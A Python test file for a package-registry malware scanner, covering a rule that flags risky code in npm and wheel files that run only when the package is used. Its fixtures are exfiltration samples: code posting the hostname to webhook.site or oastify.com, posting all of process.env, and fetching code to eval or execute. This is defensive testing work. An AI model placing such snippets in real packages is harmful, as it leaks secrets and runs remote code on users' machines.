"""SC-USE-RISK (0.1.8): the strong import-time shapes in files a package runs
only when it is used — a module no entry point loads, a script a CLI spawns
— and not in tests, examples, docs or a web app's static assets.

Payload text is inert: hosts are capture services or .invalid, nothing runs.
"""
import unittest

from tests.registry._review_support import scan_npm, scan_wheel

BEACON_JS = ("const os = require('os');\nconst https = require('https');\n"
             "module.exports = function report() {\n"
             "  https.get('https://webhook.site/0?h=' + os.hostname());\n};\n")
FETCH_RUN_JS = ("const axios = require('axios');\n(async function () {\n"
                "  const s = (await axios.get(src)).data;\n  eval(s);\n})();\n")
HARVEST_JS = ("module.exports = async () => {\n"
              "  await fetch('https://api.invalid/x', { method: 'POST', body: JSON.stringify(process.env) });\n};\n")
DOWNLOAD_RUN_JS = ("const https = require('https'), fs = require('fs');\n"
                   "const {execFileSync} = require('child_process');\n"
                   "module.exports = () => https.get('https://dl.example.invalid/tool', (r) => r.pipe(fs.createWriteStream("
                   "'/tmp/tool'))\n  .on('finish', () => execFileSync('/tmp/tool', ['--version'])));\n")
BEACON_PY = ("import socket, requests\n\ndef report():\n"
             "    requests.post('https://x.oastify.com/', data=socket.gethostname())\n")
MANIFEST = '{"name": "x", "version": "1.0.0", "main": "index.js"}'


def use_risk(res):
    return sorted((i["file"], i["sev"]) for i in res["issues"] if i["rule"] == "SC-USE-RISK")


class UseRiskTests(unittest.TestCase):
    def test_a_module_no_entry_point_loads(self):
        for name, text in (("lib/report.js", BEACON_JS), ("lib/caller.js", FETCH_RUN_JS)):
            with self.subTest(file=name):
                res = scan_npm({"package.json": MANIFEST, "index.js": "module.exports = 1;\n", name: text})
                self.assertEqual(use_risk(res), [(name, "CRITICAL")])
                self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
                msg = next(i["msg"] for i in res["issues"] if i["rule"] == "SC-USE-RISK")
                self.assertTrue(msg.startswith(name + " ") and msg.endswith(
                    "Nothing loads it at install or import: it runs when the package's code calls it."), msg)

    def test_code_the_entry_point_loads_is_the_import_time_test(self):
        res = scan_npm({"package.json": MANIFEST, "index.js": "require('./lib/report');\n", "lib/report.js": BEACON_JS})
        self.assertEqual(use_risk(res), [])
        self.assertIn(("lib/report.js", "CRITICAL"),
                      [(i["file"], i["sev"]) for i in res["issues"] if i["rule"] == "SC-IMPORT-RISK"])

    def test_only_the_strong_shapes(self):
        # a file downloaded and then run (a binary's installer) is MAJOR at import time: not one
        res = scan_npm({"package.json": MANIFEST, "index.js": "module.exports = 1;\n", "lib/fetch.js": DOWNLOAD_RUN_JS})
        self.assertEqual(use_risk(res), [])
        self.assertEqual(res["verdict"], "OK", res["verdictReason"])
        # rule set 2.17: the whole environment sent anywhere is one
        res = scan_npm({"package.json": MANIFEST, "index.js": "module.exports = 1;\n", "lib/env.js": HARVEST_JS})
        self.assertEqual(use_risk(res), [("lib/env.js", "CRITICAL")])
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])

    def test_files_that_never_run_when_the_package_is_used(self):
        for folder in ("test", "__tests__", "examples", "docs", "demo", "benchmarks", "out/_next/static/chunks",
                       "static", "public"):
            with self.subTest(folder=folder):
                res = scan_npm({"package.json": MANIFEST, "index.js": "module.exports = 1;\n",
                                f"{folder}/report.js": BEACON_JS})
                self.assertEqual(use_risk(res), [])

    def test_not_read_once_suspicious_nor_past_the_size_limit(self):
        from lazaret.registry import repo
        # SUSPICIOUS at import already (0.1.8: `_0x` names alone are MAJOR, so code that runs what it
        # fetches makes it so)
        res = scan_npm({"package.json": MANIFEST, "index.js": FETCH_RUN_JS, "lib/report.js": BEACON_JS})
        self.assertEqual((res["verdict"], use_risk(res)), ("SUSPICIOUS", []))
        self.assertIsNone(res["useTime"])                                  # the step did not run
        padded = BEACON_JS + "// " + "x" * repo.USE_RISK_MAX_CHARS + "\n"
        res = scan_npm({"package.json": MANIFEST, "index.js": "module.exports = 1;\n", "lib/report.js": padded})
        self.assertEqual(use_risk(res), [])
        self.assertEqual(res["useTime"], {"files": 0, "ofFiles": 1, "chars": 0, "ofChars": len(padded),
                                          "boundChars": repo.USE_RISK_CHARS})

    def test_past_its_bound_it_stops_without_making_the_scan_incomplete(self):
        from unittest import mock
        from lazaret.registry import repo
        with mock.patch.object(repo, "USE_RISK_CHARS", 0):
            res = scan_npm({"package.json": MANIFEST, "index.js": "module.exports = 1;\n", "lib/report.js": BEACON_JS})
        self.assertEqual((res["verdict"], use_risk(res)), ("OK", []))
        self.assertEqual(res["useTime"], {"files": 0, "ofFiles": 1, "chars": 0, "ofChars": len(BEACON_JS),
                                          "boundChars": 0})


class UseRiskBoundTests(unittest.TestCase):
    """P-14: the step reads the smallest files first, up to USE_RISK_CHARS
    characters per release file: the same files on every machine, and the
    report says how much it read. (It stopped after 3 seconds before, which
    read less on a slower machine, and said nothing.)"""

    PACKAGE = {"package.json": MANIFEST, "index.js": "module.exports = 1;\n",
               "lib/a.js": BEACON_JS, "lib/b.js": BEACON_JS + "// " + "b" * 1000 + "\n",
               "lib/c.js": BEACON_JS + "// " + "c" * 5000 + "\n"}

    def sizes(self):
        return [len(self.PACKAGE[f"lib/{n}.js"]) for n in "abc"]

    def test_smallest_first_within_the_bound(self):
        from unittest import mock
        from lazaret.registry import repo
        a, b, c = self.sizes()
        for bound, read in ((a + b + c, "abc"), (a + b + c - 1, "ab"), (a + b, "ab"), (a + b - 1, "a"), (a, "a"),
                            (a - 1, "")):
            with self.subTest(bound=bound), mock.patch.object(repo, "USE_RISK_CHARS", bound):
                res = scan_npm(self.PACKAGE)
                self.assertEqual(use_risk(res), [(f"lib/{n}.js", "CRITICAL") for n in read])
                self.assertEqual(res["useTime"], {"files": len(read), "ofFiles": 3,
                                                  "chars": sum(self.sizes()[:len(read)]), "ofChars": a + b + c,
                                                  "boundChars": bound})
                self.assertEqual(res["artifacts"][0]["useTime"], res["useTime"])

    def test_the_same_files_however_slow_the_machine(self):
        # every engine batch takes 100 s on this machine's clock: the step reads what it reads at full speed
        import time
        import types
        from unittest import mock
        from lazaret.registry import repo
        now = [time.monotonic()]
        clock = types.SimpleNamespace(monotonic=lambda: now[0])
        real = repo._engine.import_time_risks

        def slow(items, texts=None):
            now[0] += 100.0
            return real(items, texts=texts)

        fast = scan_npm(self.PACKAGE)
        with mock.patch.object(repo, "time", clock), mock.patch.object(repo, "SCAN_TIMEOUT", 1e9), \
                mock.patch.object(repo._engine, "import_time_risks", slow):
            slow_res = scan_npm(self.PACKAGE)
        self.assertGreater(now[0] - time.monotonic(), 100.0)                 # the slow clock did run
        self.assertEqual(use_risk(slow_res), use_risk(fast))
        self.assertEqual(slow_res["useTime"], fast["useTime"])
        self.assertEqual(len(use_risk(fast)), 3)

    def test_the_report_names_the_share_read(self):
        import contextlib
        import io
        from unittest import mock
        from lazaret.registry import repo
        a, b, c = self.sizes()

        def printed(res):
            out = io.StringIO()
            with contextlib.redirect_stdout(out):
                repo.print_scan(res)
            return [line.strip() for line in out.getvalue().splitlines() if "SC-USE-RISK read" in line]

        self.assertEqual(printed(scan_npm(self.PACKAGE)), [])                # all read: nothing to say
        with mock.patch.object(repo, "USE_RISK_CHARS", a + b):
            res = scan_npm(self.PACKAGE)
        percent = (a + b) * 100 // (a + b + c)
        self.assertEqual(printed(res), [
            f"SC-USE-RISK read 2 of the 3 files that run only when the package is used, {percent}% of their "
            f"characters (smallest first, none over {repo.USE_RISK_MAX_CHARS:,} characters, {a + b:,} in all per "
            f"release file)"])
        stored = dict(res, useTime=None)                    # a stored scan: the artifacts carry it
        self.assertEqual(printed(stored), printed(res))

    def test_a_release_sums_its_files(self):
        from lazaret.registry import repo
        one = {"files": 2, "ofFiles": 3, "chars": 10, "ofChars": 40, "boundChars": 10}
        two = {"files": 1, "ofFiles": 1, "chars": 5, "ofChars": 5, "boundChars": 10}
        self.assertEqual(repo.use_time_total([one, None, two]),
                         {"files": 3, "ofFiles": 4, "chars": 15, "ofChars": 45, "boundChars": 10})
        self.assertIsNone(repo.use_time_total([None, None]))
        self.assertIsNone(repo.use_time_line(None))
        self.assertIsNone(repo.use_time_line(two))
        self.assertIn(" 33% of their characters", repo.use_time_line({"files": 1, "ofFiles": 3, "chars": 1,
                                                                      "ofChars": 3}))
        self.assertIn(" 99% of their characters", repo.use_time_line({"files": 9, "ofFiles": 10, "chars": 999,
                                                                      "ofChars": 1000}))

    def test_a_python_module_nothing_imports(self):
        res = scan_wheel({"x/__init__.py": "VERSION = '1.0'\n", "x/tools/report.py": BEACON_PY,
                          "x-1.0.dist-info/METADATA": "Name: x\nVersion: 1.0\n"})
        self.assertEqual(use_risk(res), [("x/tools/report.py", "CRITICAL")])
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])


if __name__ == "__main__":
    unittest.main()
